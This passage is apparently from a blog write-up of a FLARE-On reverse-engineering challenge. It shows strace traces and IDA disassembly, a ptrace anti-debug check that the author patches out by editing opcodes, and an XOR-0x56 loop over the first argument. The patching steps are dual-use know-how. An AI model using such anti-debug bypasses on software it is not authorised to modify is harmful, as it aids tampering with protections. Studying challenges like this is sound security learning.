</span><span class="line">arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x18cb880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0x18ed1c0<span class="o">)</span>                          <span class="o">=</span> 0x18ed1c0
</span><span class="line">brk<span class="o">(</span>0x18ee000<span class="o">)</span>                          <span class="o">=</span> 0x18ee000
</span><span class="line">fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class="line">mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ffd41ca2000
</span><span class="line">write<span class="o">(</span>1, <span class="s2">&quot;na\n&quot;</span>, 3na
</span><span class="line"><span class="o">)</span>                     <span class="o">=</span> 3
</span><span class="line">exit_group<span class="o">(</span>423<span class="o">)</span>                         <span class="o">=</span> ?
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span><span class="line">execve<span class="o">(</span><span class="s2">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span class="o">[</span><span class="s2">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span class="s2">&quot;arg1&quot;</span>, <span class="s2">&quot;arg2&quot;</span><span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class="line">uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;kali&quot;</span>, ...<span class="o">})</span>  <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x128d000
</span><span class="line">brk<span class="o">(</span>0x128e1c0<span class="o">)</span>                          <span class="o">=</span> 0x128e1c0
</span><span class="line">arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x128d880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0x12af1c0<span class="o">)</span>                          <span class="o">=</span> 0x12af1c0
</span><span class="line">brk<span class="o">(</span>0x12b0000<span class="o">)</span>                          <span class="o">=</span> 0x12b0000
</span><span class="line">ptrace<span class="o">(</span>PTRACE_TRACEME, 0, 0x1, 0<span class="o">)</span>       <span class="o">=</span> -1 EPERM <span class="o">(</span>Operation not permitted<span class="o">)</span>
</span><span class="line">fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class="line">mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7fba3fee7000
</span><span class="line">write<span class="o">(</span>1, <span class="s2">&quot;Program received signal SIGSEGV,&quot;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span class="o">)</span> <span class="o">=</span> 52
</span><span class="line">exit_group<span class="o">(</span>9001<span class="o">)</span>                        <span class="o">=</span> ?
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Syscalls are similar in all traces except with two arguments. We can see that <code>ptrace</code> is being called in line 37. It’s a common <a href="http://reverseengineering.stackexchange.com/a/1931">anti-debug protection</a> in Linux. “[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime.” So we need to bypass <code>ptrace</code>. Searching for <code>ptrace</code> in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for <code>syscall</code> is moved to <code>eax</code> and then it is called. So I search for the text <code>syscall</code> in IDA and then commented each call according to <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">Linux System Call Table for x86_64</a> by <code>@pixnbits</code>. <code>ptrace</code> is <code>0x65</code>:</p>

<p><img src="http://parsiya.net/images/2014/flare/6-1.jpg" alt="ptrace call" title="ptrace call" /></p>

<p>Later I realized there was a much easier way to find it instead of discovering all calls. Running <code>strace</code> with <code>-i</code> switch will print the instruction pointer at the time of call. Let’s run <code>ptrace</code> on the binary with two arguments with this new swtich and look at the results.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>strace -i </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span><span class="line"><span class="o">[</span>    7f87e90646e7<span class="o">]</span> execve<span class="o">(</span><span class="s2">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span class="o">[</span><span class="s2">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span class="s2">&quot;arg1&quot;</span>, <span class="s2">&quot;arg2&quot;</span><span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class="line"><span class="o">[</span>          4a9297<span class="o">]</span> uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;kali&quot;</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class="line"><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0<span class="o">)</span>               <span class="o">=</span> 0x1212000
</span><span class="line"><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x12131c0<span class="o">)</span>       <span class="o">=</span> 0x12131c0
</span><span class="line"><span class="o">[</span>          45e3f5<span class="o">]</span> arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x1212880<span class="o">)</span> <span class="o">=</span> 0
</span><span class="line"><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x12341c0<span class="o">)</span>       <span class="o">=</span> 0x12341c0
</span><span class="line"><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x1235000<span class="o">)</span>       <span class="o">=</span> 0x1235000
</span><span class="line"><span class="o">[</span>          47431b<span class="o">]</span> ptrace<span class="o">(</span>PTRACE_TRACEME, 0, 0x1, 0<span class="o">)</span> <span class="o">=</span> -1 EPERM <span class="o">(</span>Operation not permitted<span class="o">)</span>
</span><span class="line"><span class="o">[</span>          473e44<span class="o">]</span> fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class="line"><span class="o">[</span>          47509a<span class="o">]</span> mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7f617785f000
</span><span class="line"><span class="o">[</span>          473f50<span class="o">]</span> write<span class="o">(</span>1, <span class="s2">&quot;Program received signal SIGSEGV,&quot;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span class="o">)</span> <span class="o">=</span> 52
</span><span class="line"><span class="o">[</span>          473dd8<span class="o">]</span> exit_group<span class="o">(</span>9001<span class="o">)</span>     <span class="o">=</span> ?
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Look at IP at the time of <code>ptrace</code> in line 9: <code>47431b</code>. Now look at the IDA screenshot above.</p>

<p>So this function calls <code>ptrace</code>. To find out where this function is being called, highlight it and press <code>x</code> in IDA. There is only one call.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>bypassing ptrace </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F1F8</span> <span class="nv">B9</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F1FD</span> <span class="nv">BA</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F202</span> <span class="nv">BE</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F207</span> <span class="nv">BF</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F20C</span> <span class="nv">B8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F211</span> <span class="nv">E8</span> <span class="mi">9</span><span class="nv">A</span> <span class="mi">50</span> <span class="mi">05</span>    <span class="nv">call</span>    <span class="nv">calls_ptrace</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F216</span> <span class="mi">48</span> <span class="nv">C1</span> <span class="nv">E8</span> <span class="mi">3</span><span class="nv">F</span>    <span class="nv">shr</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mh">3Fh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F21A</span> <span class="mi">84</span> <span class="nv">C0</span>          <span class="nv">test</span>    <span class="nb">al</span><span class="p">,</span> <span class="nb">al</span>     <span class="c1">; if ptrace return value is zero jump to bypass_ptrace</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F21C</span> <span class="mi">74</span> <span class="mi">14</span>          <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">bypass_ptrace</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F21E</span> <span class="nv">BF</span> <span class="mi">50</span> <span class="mi">3</span><span class="nv">B</span> <span class="mi">4</span><span class="nv">F</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aProgramReceive</span> <span class="c1">; &quot;Program received signal SIGSEGV, Segmentation fault&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F223</span> <span class="nv">E8</span> <span class="nv">B8</span> <span class="nv">F9</span> <span class="mi">03</span>    <span class="nv">call</span>    <span class="nv">sys_write_call</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F228</span> <span class="nv">BF</span> <span class="mi">29</span> <span class="mi">23</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mh">2329h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F22D</span> <span class="nv">E8</span> <span class="mi">5</span><span class="nv">E</span> <span class="nv">F5</span> <span class="mi">03</span>    <span class="nv">call</span>    <span class="nv">sub_45E790</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Return value from <code>ptrace</code> is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the <code>Option</code> menu and then <code>General</code>. Change the <code>number of opcode bytes</code>.</p>

<p>To patch the binary to bypass ptrace we need to change the <code>jz</code> instruction in line 9 to <code>jmp</code>. In this short jump <code>0x74</code> stands for <code>jnz</code> and <code>0x14</code> means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to <code>jmp</code>, change <code>0x74</code> to <code>0xEB</code>. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call <code>lazy patching</code>. Search for opcodes for the last few instructions before and <code>jnz</code> in hex editor. In this case we are looking for <code>48 C1 E8 3F 84 C0 74 14</code>. There is probably only one place in the binary with this sequence of bytes. Find it and change <code>0x74</code> to <code>0xEB</code>. Now we have bypassed <code>ptrace</code>. Another alternative is to replace the <code>call calls_ptrace</code> in line 6 with NOPs. NOP is short for No Operation and has the opcode <code>0x90</code>. It actually stands for <code>xchg eax, eax</code>. Both of them work.</p>

<p>So I bypassed <code>ptrace</code>. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:</p>

<ol>
  <li>The binary prints <code>no</code>. Put breakpoints on all <code>sys_write</code> calls and trace the print back</li>
  <li>The application needs to manipulate the arguments somehow. Search for <a href="http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html">string instructions</a>, breakpoint them and see if  we hit one</li>
</ol>

<p>I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a <code>repne scasb</code>.</p>

<p>What does <code>repne scasb</code> do?<br />
<code>repne scasb</code> will scan the string in <code>di/edi/rdi</code> for the byte (<code>scasb</code> is the byte version of <code>scas</code> instruction) in <code>ax/eax/rax</code> and decrease <code>cx/ecx/rcx</code> by one after each execution. It stops if <code>cx/ecx/rcx</code> reaches zero or if a match is found.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>strlen </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">CF</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C0</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">D6</span> <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">DA</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="kd">DD</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C8</span><span class="p">],</span> <span class="mh">0FFFFFFFFFFFFFFFFh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">E8</span> <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">EB</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>          <span class="c1">; null terminator</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">F0</span> <span class="nv">mov</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C8</span><span class="p">]</span>   <span class="c1">; 0FFFFFFFFFFFFFFFFh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">F7</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; rdi = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FA</span> <span class="nv">repne</span> <span class="nv">scasb</span>             <span class="c1">; searching for null terminator</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FA</span>                         <span class="c1">; in other words strlen</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FC</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FF</span> <span class="nv">not</span>     <span class="nb">rax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437102</span> <span class="nf">sub</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437106</span> <span class="nf">cmp</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mh">0Ah</span>        <span class="c1">; if ( strlen(arg1) == 10 ) jump</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043710</span><span class="nf">A</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">strlen_arg1_equals_10</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Null terminator or <code>0x00</code> is saved in eax in line 6. Line 7 has <code>rcx</code>. We don’t want <code>rcx</code> to reach zero before the end of the string. First argument is saved in <code>rdi</code> in line 8 and finally line 9 calls <code>repne scasb</code>. This is basically <code>strlen(arg1)</code>. In line 14, it is checked if the length of first argument is 10. If so we will jump. </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>strlen_arg1_equals_10 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">0000000000437120</span> <span class="nl">strlen_arg1_equals_10:</span>  <span class="c1">; strlen(arg1) == 10 Decimal</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437120</span> <span class="nf">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C0</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437127</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043712</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>           <span class="c1">; rax = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043712</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>             <span class="c1">; rdi = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437131</span> <span class="nf">call</span>    <span class="nv">sub_468BB0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437136</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1_2</span><span class="p">],</span> <span class="nb">rax</span>    <span class="c1">; rax = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043713</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">],</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437147</span> <span class="nf">jmp</span>     <span class="nv">short</span> <span class="nv">loc_437177</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can see that arg1 is saved to <code>rdi</code> in line 5 and <code>sub_468BB0</code> is called. We can get inside <code>sub_468BB0</code> but it is basically <code>malloc</code>. It allocates a string and initializes it with first argument. Return value is in <code>rax</code> which is a pointer to the newly created string. It is saved to <code>[rbp+arg1_2]</code> (I have renamed the variables). Finally there is an unconditional jump.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc_437177 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">0000000000437177</span> <span class="nl">loc_437177:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437177</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043717</span><span class="nf">D</span> <span class="nv">movsxd</span>  <span class="nb">rsi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437180</span> <span class="nf">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C0</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437187</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043718</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>       <span class="c1">; rax = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043718</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C8</span><span class="p">],</span> <span class="mh">0FFFFFFFFFFFFFFFFh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437199</span> <span class="nf">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043719</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var_3C8</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; rdi = arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">AB</span> <span class="nv">repne</span> <span class="nv">scasb</span>             <span class="c1">; strlen(arg1)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">AD</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B0</span> <span class="nv">not</span>     <span class="nb">rax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B3</span> <span class="nv">sub</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B7</span> <span class="nv">cmp</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; check if counter &lt; 11</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BA</span> <span class="nv">setb</span>    <span class="nb">al</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BD</span> <span class="nv">test</span>    <span class="nb">al</span><span class="p">,</span> <span class="nb">al</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BF</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">arg1_xor_0x56</span> <span class="c1">; if counter &lt; 11 jump to for</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437149</span> <span class="nf">for_arg1_xor_0x56</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437149</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043714</span><span class="nf">F</span> <span class="nv">cdqe</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437151</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1_2</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437158</span> <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043715</span><span class="nf">E</span> <span class="nv">movsxd</span>  <span class="nb">rdx</span><span class="p">,</span> <span class="nb">edx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437161</span> <span class="nf">add</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1_2</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437168</span> <span class="nf">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043716</span><span class="nf">B</span> <span class="nv">xor</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">56h</span>             <span class="c1">; xor with 0x56</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">000000000043716</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="nb">dl</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0000000000437170</span> <span class="nf">add</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">],</span> <span class="mi">1</span>
</span><span class="line"><span class="c1">; jumps back to top</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We see another <code>repne scasb</code>. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with <code>0x56</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc_437177 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">11</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x56</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>If the loop is done, the <code>jnz</code> in line 19 will not be triggered and we land somewhere else.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Comparison </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
